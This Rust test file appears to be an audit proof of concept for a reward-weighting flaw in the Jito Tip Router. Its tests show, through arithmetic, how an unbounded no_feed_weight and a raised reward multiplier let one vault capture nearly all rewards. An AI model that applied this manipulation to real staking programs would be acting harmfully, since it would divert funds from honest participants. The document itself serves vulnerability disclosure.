/// PoC: Weight Manipulation via no_feed_weight in Tip Router
///
/// This test demonstrates the data flow from weight configuration
/// through reward calculation to show the impact of unchecked no_feed_weight.
///
/// NOTE: This tests the CORE LOGIC only (from jito-tip-router-core),
/// not the full program. The actual program requires the restaking .so.
///
/// Run: cargo test -p jito-tip-router-core -- poc_weight_manipulation --nocapture

#[cfg(test)]
mod poc_weight_tests {
    use crate::{
        constants::WEIGHT_PRECISION,
        ncn_fee_group::NcnFeeGroup,
        stake_weight::StakeWeights,
    };

    /// Demonstrates: no_feed_weight directly scales stake_weight
    /// without any upper bound validation beyond u128 overflow.
    #[test]
    fn poc_no_feed_weight_unbounded_scaling() {
        // Simulate vault delegation of 100 SOL = 100_000_000_000 lamports
        let vault_delegation_lamports: u128 = 100_000_000_000;

        // SCENARIO 1: Normal weight (JitoSOL ≈ 1.05 SOL)
        let normal_price = 1_050_000_000u128; // 1.05 * 1e9 (WEIGHT_PRECISION)
        let normal_stake = vault_delegation_lamports
            .checked_mul(normal_price)
            .unwrap();
        println!("Normal stake_weight:  {}", normal_stake);
        // ≈ 1.05e20

        // SCENARIO 2: Attacker sets no_feed_weight = 1_000_000 * WEIGHT_PRECISION
        let attack_weight = 1_000_000u128 * WEIGHT_PRECISION; // 1e15
        let attack_stake = vault_delegation_lamports
            .checked_mul(attack_weight)
            .unwrap();
        println!("Attack stake_weight: {}", attack_stake);
        // ≈ 1e26 — 1,000,000x larger!

        // SCENARIO 3: Attacker sets no_feed_weight = u64::MAX as u128
        let extreme_weight = u64::MAX as u128;
        let extreme_stake = vault_delegation_lamports
            .checked_mul(extreme_weight)
            .unwrap();
        println!("Extreme stake_weight: {}", extreme_stake);

        // The attacker's share in a 2-vault system:
        let honest_vault_stake = normal_stake; // vault A (normal)
        let attacker_vault_stake = attack_stake; // vault B (attack)

        let total_stake = honest_vault_stake + attacker_vault_stake;
        let attacker_share_pct = (attacker_vault_stake as f64 / total_stake as f64) * 100.0;
        let honest_share_pct = (honest_vault_stake as f64 / total_stake as f64) * 100.0;

        println!("With 1,000,000x weight multiplier:");
        println!("  Attacker share: {:.4}%", attacker_share_pct);
        println!("  Honest share:   {:.4}%", honest_share_pct);

        // Attacker gets >99.999% of rewards
        assert!(attacker_share_pct > 99.999);
    }

    /// Demonstrates: StakeWeights::snapshot multiplies by reward_multiplier_bps
    /// further amplifying the weight effect.
    #[test]
    fn poc_reward_multiplier_amplification() {
        let ncn_fee_group = NcnFeeGroup::default();
        let base_stake: u128 = 1_000_000_000; // 1 SOL equivalent

        // Normal vault: weight=1.05e9, multiplier=100% (10000 bps)
        let normal_stake = StakeWeights::snapshot(
            ncn_fee_group,
            base_stake * 1_050_000_000,
            10_000, // 100%
        )
        .unwrap();
        let normal_reward_weight = normal_stake
            .ncn_fee_group_stake_weight(ncn_fee_group)
            .unwrap();
        println!("Normal reward weight:  {}", normal_reward_weight);

        // Attack vault: same weight but 2x reward_multiplier
        let attack_stake = StakeWeights::snapshot(
            ncn_fee_group,
            base_stake * 1_050_000_000, // same base weight
            20_000, // 200% reward multiplier (vs 100% normal)
        )
        .unwrap();
        let attack_reward_weight = attack_stake
            .ncn_fee_group_stake_weight(ncn_fee_group)
            .unwrap();
        println!("Attack reward weight:  {}", attack_reward_weight);

        let ratio = attack_reward_weight as f64 / normal_reward_weight as f64;
        println!("Attack/Normal ratio:   {:.2}x", ratio);

        // Attack vault gets 2x due to reward_multiplier
        assert!(ratio > 1.99 && ratio < 2.01);

        // Now demonstrate combined effect: weight * multiplier
        let combined = StakeWeights::snapshot(
            ncn_fee_group,
            base_stake * 1_000_000_000_000u128, // 1000x weight
            10_000, // 100% multiplier
        )
        .unwrap();
        let combined_weight = combined
            .ncn_fee_group_stake_weight(ncn_fee_group)
            .unwrap();
        let combined_ratio = combined_weight as f64 / normal_reward_weight as f64;
        println!("Combined (weight*mul) ratio: {:.2}x", combined_ratio);

        // Combined attack: 1000x weight * 1x multiplier = 1000x dominance
        assert!(combined_ratio > 950.0);
    }

    /// Demonstrates: Vault reward calculation formula
    /// vault_reward = rewards * vault_stake_weight / sum(all_vault_stake_weights)
    #[test]
    fn poc_vault_reward_calculation() {
        let total_rewards: u64 = 100_000_000_000; // 100 SOL in lamports

        // Two vaults with vastly different weights
        let vault_a_weight: u128 = 100_000_000_000 * 1_050_000_000; // normal
        let vault_b_weight: u128 = 100_000_000_000 * 1_000_000_000_000_000u128; // attack

        let total_weight = vault_a_weight + vault_b_weight;

        // vault_reward = rewards * vault_weight / total_weight
        let vault_a_reward = (total_rewards as u128 * vault_a_weight / total_weight) as u64;
        let vault_b_reward = (total_rewards as u128 * vault_b_weight / total_weight) as u64;

        println!("Total rewards: {} lamports", total_rewards);
        println!("Vault A (normal):  {} lamports ({:.6}%)",
            vault_a_reward,
            (vault_a_reward as f64 / total_rewards as f64) * 100.0
        );
        println!("Vault B (attack):  {} lamports ({:.6}%)",
            vault_b_reward,
            (vault_b_reward as f64 / total_rewards as f64) * 100.0
        );

        // Vault B gets >99.999% of rewards (Vault A gets negligible dust)
        assert!(vault_b_reward > total_rewards * 99999 / 100000);
        assert!(vault_a_reward < total_rewards / 100000);
    }
}
